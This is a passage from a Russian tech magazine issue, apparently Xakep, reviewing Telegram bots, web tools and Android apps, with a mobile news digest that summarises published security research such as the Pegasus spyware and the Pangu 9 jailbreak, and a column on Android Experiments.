Бот для проведения опросов. Чтобы создать опрос, добавь бота и напиши, что
будешь спрашивать. После этого добавляй варианты ответов по одному, а ког-
да закончишь, напиши /done. Бот выдаст ссылку, нажав на которую ты увидишь
список из своих групп. Выбираешь группу, и бот добавится в нее. Теперь твои
собеседники увидят опрос и смогут голосовать, набирая команды типа /1, /2
и так далее по количеству вариантов. Посмотреть результаты поможет коман-
да /results@PollBot, а подвести итоги — команда /endpoll@PollBot.





@SberometerBot
Этот бот задумывался разработчиками как оперативный способ узнавать
об изменениях курса доллара. С тех пор именно эта функция перестала ра-
ботать и перекочевала в отдельный канал sberometer_kurs. Зато бот сообщает
курс доллара по команде /kurs и конвертирует из иностранных валют в руб-
ли, если написать что-нибудь вроде /EUR количество (без параметра эта ко-
манда выведет курс евро). Список поддерживаемых валют можно посмотреть
при помощи команды /list, а команда /news выведет несколько последних
финансовых новостей.





@EmiasInfoBot
Ты не поверишь, но это бот для записи в поликлинику. Если ты живешь в Москве
и тебя беспокоит какой-нибудь недуг, то это твой шанс перестать игнорировать
проблему и наконец записаться на прием к врачу. Бот, как и сайт emias.info,
создан на основе открытых API, которые портал госуслуг предоставляет сто-
ронним разработчикам. Все, что нужно для авторизации, — это номер СНИЛС.
Если не потерял его, то добро пожаловать в виртуальную регистратуру!





Контент и развлечения

@minupornobot
Без ботов, поставляющих порнографию, наш список был бы неполным, тем
более что @minupornobot гордо занимает первое место в рейтинге «Телегра-
ма». Принцип прост: командой /search  что-нибудь можешь искать ролики
по ключевым словам, команды /popular и /random выдают наиболее популяр-
ное или случайное видео соответственно. Еще бот дважды в день шлет ссыл-
ки самостоятельно — так сказать, для поддержания либидо. Если боишься,
что кто-нибудь случайно увидит уведомление, скажи боту /off, и он прекра-
тит безобразие. Изначально, кстати, мы хотели вместо него порекомендовать
@Pornhub_Bot, но Роскомнадзор вовремя подсуетился и перекрыл в России
доступ к PornHub. К сожалению, бот не заменяет сайт, а лишь шлет ссылки
на него.





@ru_tracker_bot
Многих других ботов можно обвинить в том, что они по функциональности
не дотягивают до аналогичных сайтов. Но только не бот Rutracker.org! Это пол-
ноценная версия трекера, в которой можно искать (просто напиши запрос),
сортировать выдачу (к примеру, команда se отсортирует по количеству сидов,
а sz — по размеру раздачи) и получать magnet-ссылки на торренты. Чтобы за-
просить magnet link, найди в выдаче под описанием интересующей раздачи
ссылку вида /download_символы и просто нажми на нее. Не хватает разве что
возможности выбрать раздел для ограничения поиска.





За день до сдачи статьи бот перестал отвечать на поисковые запросы,
но на следующий день снова ожил. Судя по отзывам на форумах, такие пере-
бои в работе — обычное дело.

@VKAudioBot
Скачивание музыки из «Вконтакте» — вечно актуальная тема. И конечно же,
для этих целей существует бот. Он через API подключается к «Вконтакте» и за-
прашивает доступ к аудиозаписям. Подтвердив, можно жать кнопку «Мои ау-
диозаписи» и листать страницы с треками. Бот позволяет посмотреть до-
бавленные альбомы (кнопка «Выбрать альбом») и плей-листы. Файлы можно
скачивать или слушать прямо в «Телеграме». К сожалению, в версии Telegram
для iOS бот заблокирован.





@GetMusicBot
Другие  два ценных  источника музыки —  это YouTube и  SoundCloud.
@GetMusicBot предназначен для работы с ними. Можешь отправить боту
ссылку на страницу, и, немного подумав, он выдаст аудиофайл. Еще бот по-
зволяет искать музыку, не покидая Telegram. Для поиска по YouTube есть ко-
манда /yts запрос, для SoundCloud — /sc. Команда /next листает страницы
выдачи. Интересно, что с YouTube можно скачивать не только аудио, но и ви-
део. Неплохая замена для вышедшего из строя @iVideoBot.





@swatcher_bot
Если ты подсел на какой-нибудь идущий сейчас зарубежный сериал и хочешь
знать, когда уже наконец выйдет новая серия, добавляй себе @swatcher_bot.
Пишешь ему название сериала, он уточняет запрос и подписывает тебя на ин-
формацию о выходе новых серий. Когда какая-то из релиз-групп опубликует
перевод, тебе поступит уведомление. Увы, подписаться на конкретную груп-
пу нельзя, так что о каждой серии ты будешь узнавать раза по четыре. Ссылок
на скачивание тоже не дают.





@guggybot
Напоследок — чисто развлекательный, но интересный бот. Пишешь ему лю-
бую строчку, а он накладывает ее на анимированный GIF. Интересная особен-
ность заключается в том, что гифка обычно имеет некоторую связь с тем, что
написано, причем даже если писать по-русски. Польза, конечно, сомнительна,
зато весело.
PC ZONE





                                            Андрей Письменный
                                                      apismenny@gmail.com


       MORSECODE.IO — САЙТ ДЛЯ ТЕХ, КТО РЕШИЛ
       ОСВОИТЬ АЗБУКУ МОРЗЕ
             morsecode.io
 1





                            В приключенческих книгах, когда герои сталкиваются с азбукой
         Морзе, всегда оказывается, что кто-нибудь из них по чистой слу-
          чайности ею владеет. Раньше это было более вероятно: с морзян-
           кой, к примеру, были знакомы радиолюбители. В наше время знать
          азбуку Морзе совершенно не обязательно, но если есть желание
          обучиться или хотя бы поинтересоваться тем, как она работает, то
          в этом деле поможет сайт morsecode.io.
           Идея чем-то похожа на клавиатурный тренажер. Нажимаем крас-
         ную кнопку (или «пробел» на клавиатуре) и, следуя руководству
          в левой части экрана, вводим букву за буквой. Для лучшего усвое-
          ния тренажер будет время от времени просить набрать что-нибудь
         без подсказок, но их при желании можно запросить, нажав Show Hint.
           К сожалению, morsecode.io весь на английском, да и азбу-
          ке учит только латинской. В бесплатной версии доступны уро-
          ки по всем буквам, а вот чтобы перейти к практическим занятиям
         по расшифровке аудио, придется заплатить 4 доллара.
              Кстати, для кириллической азбуки Морзе в русской Википедии
          есть так называемая таблица «напевов» — слов, которые помогают
          выучить коды букв. Еще можно поинтересоваться списком Q-кодов
         и словарем радиожаргона.

       VIMIUM — ПЛАГИН, КОТОРЫЙ ДОБАВИТ В CHROME
      ШОТКАТЫ В СТИЛЕ VIM
            Vimium
 2





                            Есть два типа пользователей: одни ненавидят консольный тек-
         стовый редактор Vim со страшной силой и стараются по возможно-
          сти избегать встречи с ним, другие, наоборот, обожают его. Плагин
         для Chrome под названием Vimium предназначен как раз для по-
         следней категории. Браузер — вторая нужнейшая программа, и ис-
          пользовать в нем те же шоткаты, что и в редакторе, совершенно
          естественно.
            Впрочем, действительно одинаковых шоткатов не так уж и мно-
          го – программы все же разные. Прокрутка страницы при помощи j
         и k и поиск по / (после чего n и N перебирают совпадения) — это,
          пожалуй, и всё. Но главное — это не кнопки, а сам принцип выбора
          шоткатов. К примеру, для закрытия табов значительно удобнее на-
         жимать x, чем Ctrl-W. Кстати, обрати внимание: шоткаты в справке
          (она вызывается по ?) указаны с учетом регистра. То есть H (назад
           к предыдущей странице) — это на самом деле Shift-H.
          Со свойством Vimium реагировать не на кнопки, а на вводимые
        ими символы связана небольшая засада: если выбрана русская
          раскладка, то стандартные шоткаты работать не будут. Но не беда!
         Добавить кириллические буквы можно в настройках. Жми пра-
         вой кнопкой мыши на значок Vimium, выбирай Options и в поле
         Custom key mappings можешь, к примеру, добавить строку map  ч
          removeTab. А теперь скажи спасибо хорошим парням, которые уже
         проделали за тебя всю работу и выложили на GitHub готовый кон-
         фиг для русской раскладки.
         И еще один важный момент. Обычные шоткаты после установки
         Vimium не пропадут. Так что если вдруг по старой памяти нажмешь
         Ctrl-F5 или Ctrl-t, то Chrome поймет тебя без проблем. Vimium,
           кстати, можно отключить на определенных сайтах, чтобы он не ме-
        шал работать с веб-приложениями и играть в браузерные игры.

       SHAPECATCHER — ПОИСКОВИК СИМВОЛОВ UNICODE
      ПО ИХ ФОРМЕ
             shapecatcher.com
3





                            Набор символов в таблицах Unicode поистине огромен: UTF-16
          позволяет присвоить коды более чем миллиону знаков. Из них пока
          что используется лишь 128 тысяч, но и это уже немало. Когда нужно
          ввести конкретный символ, а его название неизвестно, это может
          вылиться в многочасовые поиски по таблицам. Сервис Shapecatcher
         призывает на помощь распознавание рукописного ввода и старает-
          ся подобрать символы, максимально похожие на то, что пользова-
          тель накорябает мышкой.
           Сервис прост как мычание: рисуем в окошке нужную загогулину,
        нажимаем Recognize, и Shapecatcher покажет все символы, кото-
        рые посчитает похожими. С первой попытки, к сожалению, получа-
          ется не всегда, поэтому жми Clear и рисуй снова, если не найдешь
            то, что искал. В теории можно даже попытаться найти эмодзи,
         но с этим у «Шейпкетчера» не так хорошо, как с буквами, стрелка-
        ми и прочими значками.
             Чуть ли не интереснее самого сервиса та работа, на которой
         он основан. Алгоритм не включает в себя никаких модных глубоких
          нейросетей: символы распознаются по так называемым контек-
         стам — совпадающим опорным точкам.
            Изначальной целью было создание системы распознавания
        reCAPTCHA на основе этого алгоритма. В своей научной рабо-
          те (pdf) автор сервиса Бенджамин Майлд пишет, что ему удалось
         добиться успеха примерно в 5% случаев. Впрочем, с тех пор раз-
          работчики reCAPTCHA уже успели подтянуть сложность, и теперь
          остается применять разработку лишь в самых мирных целях.
MOBILE


ВЫПУСК #23.
СОФТ С XDA-DEVELOPERS.COM
КАРМАННЫЙ

                     Сегодня в выпуске
                     отборный софт,
                     созданный ребятамиСОФТ                      с форумов xda-developers.
                      com: продвинутый
                     блокировщик рекламы
                          AdClear, приложение
                     для отложенной
                      отправки СМС и писем
                  Do It Later, приложение
                     для калибровки цветов
                      экрана Color Changer,
                      а также новый лаунчер
                     для устройств Nexus.





NEXUS LAUNCHER
В начале  августа в  сеть попал  пакет
APK с новым лаунчером, эксклюзивным
для устройств Nexus. В сравнении со стан-
дартным лаунчером из AOSP и Google
Home в нем полностью изменился дизайн,
исчезла строка поиска, место которой
заняли большая буква G и текущая дата.
Кнопка меню приложений тоже исчез-
ла, ее заменил свайп снизу вверх (прямо
как в Android 1.0). Само меню приложе-
ний также стало другим и теперь включает
в себя строку поиска и четыре иконки наи-
более используемых приложений.
   Лаунчер был сильно не доработан, по-
стоянно крашился, но снискал любовь
пользователей. Поэтому вскоре в сети по-
явились zip-архивы, позволяющие устано-
вить лаунчер как системное приложение,
что позволяло получить доступ к Google
Now. По ссылке один из таких архивов,
его следует устанавливать с помощью ка-
стомного рекавери, так же как и любую
прошивку.
                                                      Nexus
                                                          Launcher
                                                     Платформа:
                                                                    Android 5.0
                                                       Цена:
                                                               бесплатно



ADCLEAR
Блокировщик рекламы от компании Seven,
не требующий прав root. Как и AdBlock
для Android, реализован в виде локаль-
ного VPN-сервера, пропускающего через
себя весь входящий трафик, попутно вы-
резая из него рекламу. По словам разра-
ботчиков, их приложение лучшее среди
блокировщиков YouTube-рекламы и един-
ственное для Android, что умеет блокиро-
вать зашифрованную рекламу.
   Как и все блокировщики, основанные
на VPN, имеет две ключевые проблемы:
•  приводит к повышенному расходу за-
   ряда батареи, так как создает допол-
   нительный слой обработки входящего
   трафика прямо на устройстве;
•  не всегда ведет себя корректно (напри-
   мер, может привести к лагам и крашам
   приложения/игры в момент показа ре-
   кламы).

С другой стороны, это отличный вариант
для нерутованного смартфона. Тем же,
у кого есть root, настоятельно рекомен-                   AdClear
дуем смотреть в сторону AdAway, он лег-                 Платформа:
ко и быстро без оверхеда и повышенного                     Android 4.1
расхода батареи блокирует любую рекламу                  Цена:
с помощью системного DNS-резолвера.                       бесплатно




DO IT LATER
Наверняка каждому  хоть раз  в жизни
нужно было отправить СМС или письмо
не прямо сейчас, а в определенное вре-
мя, например через час или в семь утра
следующего  дня. Решить такую задачу
можно с помощью Tasker, но для неопыт-
ного пользователя его настройка обер-
нется кошмаром. Другие подобные при-
ложения для автоматизации не намного
проще в использовании.
  Do It Later — простое и легкое прило-
жение для отложенной отправки СМС,
писем и создания напоминаний. Никаких
сложных конфигов и условных переходов,
никаких профилей и задач. Просто нажи-
маешь на значок карандаша, выбираешь
тип отложенной операции и заполняешь
поля. И все — в назначенное время при-
ложение сделает что нужно. Приложение
полностью бесплатное, но за это придет-
ся расплачиваться, созерцая вырвиглаз-
ный интерфейс.

                                                Do It Later
                                                     Платформа:
                                                                    Android 4.1
                                                       Цена:
                                                               бесплатно





COLOR CHANGER
Очередной калибровщик цветового ба-
ланса экрана. Позволяет придать картин-
ке разные оттенки: песчаный (для более
приятного чтения), красный (для комфорт-
ного использования смартфона в пол-
ной темноте), сделать экран монохром-
ным, снизить преобладание синего цвета
для более щадящего глаза чтения по ве-
черам и легкого засыпания и так далее.
   Это далеко не единственное подобное
приложение в маркете, но его преиму-
щество в том, что вместо создания полу-
прозрачного окна поверх остальных окон
экрана, которое бы эмулировало измене-
ние цветов, оно действительно перена-
значает выводимые на экран цвета. Это
позволяет добиться более точного не-
искаженного изображения.
  Приложение бесплатно, но некоторые
функции доступны только в платной вер-
сии.

                                                              Color Changer
                                                    Платформа:
                                                                    Android 4.4
                                                       Цена:
                                                               бесплатно / 52 р.
MOBILE
МОБИЛЬНЫЙ





                                                                                    Евгений Зобнин
                                                                                                    zobnin@gmail.comДАЙДЖЕСТ
АВГУСТА





«УБИЙЦА ANDROID» ОТ GOOGLE, ANDROID
7.0, CYANOGENMOD ZNH5Y И НЕЙРОННАЯ
СЕТЬ ВНУТРИ ПРОЦЕССОРА GALAXY S7



Сегодня в выпуске: «Фуксия» — новая операционка
от Google, способная работать на всем, начиная от ми-
кроскопического процессора SIM-карты и заканчивая
стационарными ПК, финальная версия Android 7.0 Nougat
и начало работы над CyanogenMod 14, подробности о на-
чинке очков дополненной реальности Microsoft HoloLens.
А также: исследование нашумевшего iOS-трояна Pegasus,
подробности реализации Pangu 9 и тест мобильных анти-
вирусов на взлом. Приятного чтения.

СОБЫТИЯ
«Google разрабатывает замену для Android», «Новая мобильная операционка
от Google», «Google больше не нужен Android» — заголовки статей 12 августа.
А все потому, что сотрудники Google то ли случайно, то ли намеренно открыли
доступ к репозиторию находящейся в начальной стадии разработки операци-
онной системы Fuchsia («Фуксия»).
   Несмотря на отсутствие документации на ОС, журналисты выяснили, что
«Фуксия» базируется на минималистичном ядре LK, способном работать в ус-
ловиях очень малого объема ОЗУ и низкой производительности процессора.
Поверх LK реализовано ядро Magenta, обеспечивающее полноценное окру-
жение исполнения для реализации таких концепций, как процессы, пользова-
тели и права доступа. Поверх него работает фреймворк Flutter, предназначен-
ный для разработки интерфейса на языке Dart, который Google в свое время
продвигала как замену JavaScript.
   Операционка способна работать на процессорах ARM, ARM64 и x86-64,
так что предположение о том, что Google разрабатывает если не мобильную
ОС на замену Android, то универсальную ОС на замену всего и вся, вполне
оправданно. Проблема только в том, что с точки зрения бизнеса это был бы
очень глупый шаг, так что на самом деле это либо чисто исследовательский
проект, либо нечто, нацеленное на «интернет вещей» (IoT).


                                                                  Процесс
                                                                       загрузки
                                                                           Fuchsia





РЕЛИЗЫ
22 августа, после пяти preview-версий, Google выкатила долгожданную Android
7.0 Nougat. Изменения в ней коснулись не только внешнего облика и безо-
пасности — появились давно ожидаемые функции, такие как многооконный
режим, ночной режим и возможность отправки ответа через уведомление.
Android 7.0 наконец-то получил поддержку нового графического API Vulkan,
полноценную поддержку режима виртуальной реальности (Daydream), систему
фоновых обновлений, которая устанавливает новую версию прошивки рядом
с основной, защищая от ошибок прошивки, и позволяет откатиться к старой
версии. А после обновления прошивки теперь не надо будет ждать «оптимиза-
цию приложений» благодаря гибридному JIT/AOT-компилятору.
  Подробно обо всех этих новшествах мы уже писали в дайджестах за про-
шлые месяцы, а также в статье «Android N: Десктоп, энергосбережение и ги-
бридный компилятор». Поэтому не будем повторяться, скажем лишь, что
Google уже выложила исходные тексты новой версии Android в свободный до-
ступ, а разработчики CyanogenMod скопировали их в собственный репозито-
рий и начали работу над CM 14. Одновременно с выпуском новой версии си-
стемы Google заявила о переходе к более строгому и частому плану выпуска
новых версий ОС, который предполагает ежеквартальное обновление опера-
ционной системы.
   Какие устройства получат обновление до Nougat, как обычно, не очень
понятно. Но можно сказать наверняка, что владельцам устройств на базе
Qualcomm Snapdragon 800/801 (Galaxy S5, OnePlus One, LG G3) официаль-
ную прошивку ждать не стоит: для сертификации со стороны Google на пред-
мет совместимости с Nougat устройство должно обеспечивать поддержку
OpenGL 3.1 и Vulkan, а Qualcomm отказалась выпускать обновленные драйве-
ры для «устаревших» чипсетов.





                                   Режим разделения экрана в Android 7.0


Другой заметный релиз августа касается CyanogenMod — это большое об-
новление CM 13 до версии ZNH5Y. Новая версия базируется на исходном
коде Android 6.0.1 r61, включающем в себя множество различных багфиксов,
в том числе фиксы знаменитой уязвимости QuadRooter в чипах Qualcomm.
Однако разработчики подчеркивают, что исправлена она далеко не для всех
устройств, — уязвимость выявлена в бинарном компоненте, который сами
разработчики CyanogenMod исправить не могут, а производитель уже пере-
стал выпускать обновления для устаревших чипов.
  Основные новшества сборки ZNH5Y в сравнении с предыдущей версией:
•  новое оформление экрана загрузки после
   обновления прошивки;
•  возможность автоматически отключать
   точку доступа через указанный проме-
   жуток времени после дисконнекта по-
   следнего клиента;
•  тонкая настройка светодиода для раз-
   ных уведомлений;
•  возможность запретить любому прило-
  жению доступ в сеть по Wi-Fi, мобиль-
  ным сетям или полностью (Конфиденци-
   альность  Защищенный режим);
•  для подключенных Bluetooth-устройств
   теперь отображается индикатор заряда;
•  погода теперь показывается из разных
   источников с помощью подключаемого
   плагина;
•  на экране блокировки теперь можно
   разместить сведения о погоде и живые
   обои (Экран блокировки  Живой экран
   блокировки);
•  Snap Camera — фирменное приложе-
   ние камеры CyanogenMod, использую-
  щее особые функции чипов Qualcomm
   Snapdragon;
                                                                                Gello Browser
•  Gello Browser — браузер, включающий
   в себя встроенный блокировщик рекламы,
  режим энергосбережения и возможность
   сохранения страниц для офлайн-чтения.

26 августа стала доступна Maru OS 0.2.4, новая версия операционки, совме-
щающей в себе Android и дистрибутив Debian, который становится доступен
при подключении смартфона к монитору или телевизору. Единственное нов-
шество свежей версии — полностью открытый исходный код. Так что теперь
любой может присоединиться к разработке и начать процесс портирования
ОС на другие устройства (сейчас Maru OS доступна только для Nexus 5).

ИНСТРУМЕНТЫ
•   Verify.ly — простой сервис для анализа приложений на аномальное пове-
   дение или утечки данных. Показывает, что был использован интернет (с
  шифрованием или нет), было обращение к GPS, получены личные данные
   пользователя, какие сторонние библиотеки использует приложение. Пока
   что любое приложение для проверки загрузить нельзя, так что приходится
   довольствоваться имеющейся базой.
•  APKiD — инструмент для проверки APK на предмет применения обфускато-
   ров, упаковщиков и модификации кода. Другими словами, APKiD позволяет
   выяснить две вещи: содержит ли приложение средства защиты от реверсе-
   ров и приложил ли реверсер к нему руку. Вводная статья об инструменте
   от его автора.





                                          Анализ Pokemon Go с помощью Verify.ly

УСТРОЙСТВА
«Внутри мобильного процессора Exynos M1 найдена нейронная сеть» — еще
один громкий заголовок августа. К сожалению, многие СМИ так и не удосужи-
лись разобраться, что это на самом деле такое и зачем. В действительности
небольшая нейронная сеть используется для предсказания следующих ко-
манд процессора с целью оптимизации их исполнения с помощью конвейера
(например, чтобы не сбрасывать состояние конвейера при переходах на дру-
гие участки кода). Так что пока никаких скайнетов, к сожалению. Только опти-
мизации, только хардкор.





                                      Блок предсказания инструкций Exynos M1


Еще одна интересная новость, касающаяся внутреннего устройства мобиль-
ных гаджетов, пришла от Microsoft. На конференции Hot Chips, посвященной
полупроводниковой промышленности и микропроцессорам, представите-
ли компании рассказали, как устроен внутри шлем дополненной реальности
HoloLens.
  Сердце устройства — так называемый голографический блок обработки
данных (Holographic Processing Unit, HBU), представляющий собой специаль-
но разработанный для HoloLens процессор, который состоит из 24 DSP-ядер
Tensilica и включает в себя 1 Гбайт памяти DDR3 и 8 Мбайт SRAM. Производи-
тельность — триллион операций в секунду, размер — 12 x 12 мм, энергопо-
требление — менее 10 Вт.
  HBU собирает данные с датчиков устройства, рассчитывает положение го-
ловы, рук, положение изображения накладываемой на реальные объекты кар-
тинки и передает эти данные чипсету Intel Atom x86 Cherry Trail, который осна-
щен 1 Гбайт оперативной памяти и работает на базе Windows 10.
  По словам создателей, такая архитектура позволила достичь 200-кратного
прироста производительности используемых в HoloLens алгоритмов в сравне-
нии с исключительно программным расчетом на том же Intel Atom.





                                                            Holographic Processing Unit

ПОЧИТАТЬ
Technical Analysis of Pegasus Spyware (pdf) — анализ того самого трояна
Pegasus, использующего сразу три уязвимости iOS для захвата контроля над
iPhone. Pegasus эксплуатирует брешь в WebKit, чтобы попасть на устройство
жертвы после открытия страницы в веб-браузере, затем загружает payload
в ядро, чтобы получить джейлбрейк, и прописывает в систему бэкдор.
   Бэкдор использует в своей работе Cydia Substrate для перехвата контро-
ля над системными приложениями и может получить доступ к данным о звон-
ках, календарю, адресной книге, узнать местоположение устройства, извлечь
пароли из keyring и данные многих популярных приложений, среди которых
Gmail, Viber, Facebook, Telegram, Skype, Vkontakte. В качестве вишенки на тор-
те — механизм удаленного самоуничтожения, удаляющий все следы зловреда
из системы.
  По оценке Lookout, троян был в использовании уже более года и способен
поражать устройства начиная с iPhone 4s и заканчивая iPhone 6s, работаю-
щие под управлением iOS 7 и выше. Клиенты компании, разработавшей троян,
NSO Group, — авторитарные правительства разных стран.
   Android: protecting the kernel (pdf) — интересное исследование уязвимостей
Android с 2014 по 2016 год. За два года произошел существенный сдвиг в сто-
рону выявления багов в ядре Linux. Если в 2014-м 96% уязвимостей были най-
дены в коде Android, то в 2016-м процент багов, обнаруженных в ядре, возрос
до 36%. Причина этого в первую очередь в применении SELinux — механизма,
существенно осложняющего взлом с помощью уязвимостей в пространстве
пользователя.
  Но что более интересно — 85% багов, найденных в ядре, относятся вовсе
не к коду ядра Linux, а к коду закрытых драйверов, поставляемых разработчи-
ками мобильных чипсетов. И более половины этих багов — глупейшие ошиб-
ки, такие как отсутствие проверки на длину массива или проверки на NULL.





                             Причины возникновения уязвимостей в ядре Android

Intelligence Services are Scary af — на удивление хорошо написанная статья
security-ресерчера The Grugq о современных мессенджерах и их роли в коор-
динации атак террористов. В статье он высказывает мысль, что мессендже-
ры с end-to-end шифрованием не только не мешают борьбе с террористами,
но и, наоборот, помогают спецслужбам выследить их.
   Его идея очень проста: несмотря на то что современные мессенджеры мо-
гут обеспечить полную защиту от чтения сообщений, многие из них оставля-
ют открытыми метаданные самой переписки: какой номер, с кем и когда всту-
пал в контакт. Именно эта информация нужна спецслужбам в первую очередь,
и они ее могут получить, обратившись к компаниям, владеющим сервисами,
или к Google/Apple, сервисы которых используют Telegram и WhatsApp для от-
сылки push-уведомлений. В результате, излишне полагаясь на «безопасность»
мессенджеров, террористы сами становятся виновниками утечек данных.
   Demystifying the Secure Enclave Processor (pdf) — рассказ о внутреннем
устройстве Secure Enclave Processor (SEP), специального сопроцессора чипсе-
тов Apple, отвечающего за хранение ключей шифрования и выполнение крипто-
графических операций. Внутреннее устройство процессора хранится в тайне,
и полная информация о том, как он работает, доступна только инженерам Apple.
Однако авторам доклада удалось выяснить множество подробностей.
   Secure Enclave реализован на базе процессорного ядра ARM v7a, работа-
ющего на частоте 300–400 МГц. В нем используется специальная ОС на базе
микроядра L4 (SEPOS), которая включает в себя собственные драйверы, сер-
висы и приложения. Постоянная и оперативная память процессора шифруют-
ся с помощью AES. Основной процессор не может получить к ней доступ, поэ-
тому для обмена данными между основным процессором и SEP используется
Mailbox — сообщения длиной 8 байт.
   Документ охватывает множество различных аспектов работы SEP, от инициа-
лизации и формата сообщений до архитектуры SEPOS и API, используемого iOS
для общения с SEP (он реализован в драйвере ядра iOS AppleSEPManager.kext).





                                                             Архитектура SEPOS

Pangu 9 Internals (pdf) — слайды с презентации, посвященной внутреннему
устройству утилиты для джейлбрейка Pangu 9 и нескольких предыдущих версий
утилиты. Участники команды Pangu рассказывают о том, что для взлома iOS 7.1
было достаточно сформировать динамическую библиотеку, а затем подписать
ее сертификатом с истекшим сроком и загрузить в системный процесс, указав
путь до библиотеки в системной переменной DYLD_INSERT_LIBRARIES. Далее
библиотека эксплуатировала уязвимость в ядре для получения безграничных
прав в системе.
   Apple закрыла данную брешь, реализовав механизм Team ID validation, за-
прещающий загрузку сторонних библиотек. Однако для некоторых сервисов
компания сделала исключение, чем и воспользовались Pangu для реализации
джейлбрейка iOS 8. Pangu 8 внедрялся в neagent, реализующий поддержку
сторонних VPN-сервисов.
   Apple исправила баг в iOS 8.3. Поэтому ребята из Pangu пошли другим пу-
тем и воспользовались уязвимостью в системе обмена сообщениями XPC,
а точнее реализации системы обработки сообщений в демоне assetsd. Это
старая как мир ошибка обработки путей к файлам, называемая Path Traversal
Vulnerability, — передав демону особым образом сформированный путь, мож-
но было перезаписать любой системный файл.
  Данную уязвимость Apple закрыла в iOS 9, поэтому хакеры вновь вернулись
к идее использовать механизм загрузки внешних библиотек и в этот раз сфор-
мировали цепочку атак, эксплуатирующих сразу несколько уязвимостей. Pangu
9 подключал Developer Disk Image (DDI) с устаревшей уязвимой (но подписан-
ной ключом Apple) версией демона vpnagent, далее использовал очередную
уязвимость в XPC для того, чтобы скопировать vpnagent в систему, подклю-
чал дебаггер к vpnagent, в результате чего в последний можно было загрузить
любую библиотеку на манер Pangu 7. Затем библиотека использовала уязви-
мость в ядре для отключения sandbox’а и получения полных прав в системе.
   Smartphone Antivirus and Security Applications Under Fire (pdf) — презентация
об исследовании защищенности антивирусов, представленная на конферен-
ции DEF CON 24. Исследователи из Team[SIK] попытались провести разные
типы атак на антивирусные приложения и добились успехов.
   Оказалось, что антивирус AndroHelm можно легко взломать, изменив кон-
фигурационный файл, а также заставить выполнить СМС-команду (например,
вайп), просто отправив СМС без указания пароля. Антивирус ESET также ока-
зался уязвим к взлому (с целью активации платных функций) с помощью ана-
лиза трафика, а антивирус Касперского — к удаленному внедрению кода с по-
мощью атаки MITM.





                       Почти все известные антивирусы уязвимы к разному типу атак
 MOBILE: Колонка Евгения Зобнина
ЭКСПЕРИМЕНТЫ
С ANDROID





                       Евгений Зобнин
                                                      zobnin@gmail.com




 У Google есть сайт Chrome Experiments, на котором пользовате-
 ли могут публиковать необычные, странные и просто смешные
 веб-приложения для веб-браузера Chrome. Именно там впервые
 появились Google Gravity, BioDigital Human, WebGL Globe и другие
 интересные веб-аппы. Однако не все знают, что подобный веб-
 сайт есть и для другого известного продукта Google — Android
 Experiments. И там тоже много чего занятного.





 ИГРА В УВЕДОМЛЕНИЯ
 На самом деле экспериментов пока не так уж много. Чуть меньше пятидесяти
 проектов, выполненных как классические приложения или программно-аппа-
 ратные комплексы типа «стенда улыбок» или роботов с автопилотом. Однако
 и среди них можно найти массу интересного. Как насчет игры, в которую мож-
 но играть прямо в панели уведомлений? Запускаем HungerMoji, вытягиваем
 шторку, выбираем, смахивая уведомления, персонаж и еду, за которой он бу-
 дет охотиться. Смахиваем последнее уведомление, чтобы начать.
   Персонаж передвигается по верхнему уведомлению, а навстречу ему «ле-
 тят» другие уведомления снизу. Они содержат фрукты, овощи, мороженое
 и прочие яства. Иногда будут попадаться и бомбы. Чтобы защитить персонаж,
 их необходимо смахивать. Задача, как и положено в играх подобного рода, —
 продержаться как можно дольше. Видео.





 Глупость? Вообще — да, но если в Android с помощью одних лишь уведом-
 лений можно реализовать целую игру, включая интерфейс запуска, то нельзя
 ли пойти дальше? API уведомлений позволяет делать огромное количество
 интересных вещей, выводить и менять изображения, добавлять кнопки, раз-
 вертываемое меню, по-разному обрабатывать смахивания в разные стороны,
 подменять старое уведомление на новое, управлять их показом и читать ин-
 формацию о других уведомлениях.
   Кажется странным, что никто до сих пор не задействовал эти возможности
 для создания полноценных приложений. Например, читалки новостей, которая
 была бы реализована как уведомление: смахиваешь и видишь следующую но-
 вость, нажимаешь кнопку и сохраняешь в Pocket, нажимаешь на другую кнопку
 и открываешь в веб-браузере. Ну или представь аудиоплеер без интерфейса,
 который позволяет переключать композиции смахиванием в разные стороны
 и выводит более подробную информацию о треке при разворачивании. Ника-
 кого громоздкого интерфейса, плеер, который всегда доступен и полностью
 управляется из шторки. Я бы хотел такой.

 НЕ СМОТРИ НА МЕНЯ!
 Еще один интересный полуигровой проект — это
 Boo!. Задача проста — не смотреть на экран. Если
 все пойдет по плану, на экране соберутся не-
 сколько шарообразных существ. Как только взгля-
 нешь на экран — все пропало, они заметят тебя
 и разбегутся в разные стороны. Видео.
   В целом ничего особенного, но игра затраги-
 вает тот самый мучающий всех вопрос: можно ли
 управлять смартфоном одним лишь взглядом?
 Некоторые производители уже пытались приме-
 нить подобную технологию, но больших успехов
 не добились. Фирменная прошивка смартфонов
 Samsung еще с версии для смартфона Galaxy S4
 включает функцию слежения за глазами при чте-
 нии, поддерживая экран включенным, пока ты
 не закроешь глаза (уснешь), но популярностью
 она не пользуется.
   В современных версиях  Android есть по-
 хожий метод для подтверждения  аутентифи-
 кации по снимку лица: недостаточно показать
 себя, надо еще и моргнуть, доказав, что ты не бумажный. Кто пользуется этой
 функцией? Подумай сам. Отдельные разработчики пытаются пойти дальше,
 но тоже без особого успеха. Взгляни хотя бы на рейтинг довольно интерес-
 ного концептуального приложения Eye Tracker, позволяющего набирать текст
 с помощью движения глаз. Интересная задумка, но таких мучений не пожела-
 ешь никому.
   В общем, постоянное топтание на месте, с кучей непонятных полуработаю-
 щих экспериментов. А ведь так хотелось.

 РАЗБЛОКИРОВКА НАКЛОНОМ
 Но вернемся к нашим баранам, а точнее экспе-
 риментам. GestureLock — локскрин, позволяю-
 щий разблокировать экран с помощью движе-
 ний смартфона. Для начала обучаешь смартфон,
 наклоняя в разные стороны, а затем повторя-
 ешь те же действия для разблокировки экрана.
 Пять с плюсом за оригинальность, да и взло-
 мать не так уж просто, если движений действи-
 тельно много. Вот только запомнить их — задача
 не из тривиальных, слишком уж непривычен сам
 тип запоминаемой информации. Черт его зна-
 ет, на сколько градусов ты наклонил смартфон
 в третий раз. Видео.
   Судя по всему, задача этого эксперимента —
 показать более удобный и действенный способ
 разблокировки, и отчасти разработчику это уда-
 лось. Если поискать, то в маркете можно обна-
 ружить и другие попытки решить ту же задачу.
 Например, DroidLock позволяет использовать
 в качестве PIN’а текущее время, дату, процент
 заряда батареи или все эти данные, перемешанные вместе с помощью одно-
 му тебе известного алгоритма. Реализация подобной функциональности есть
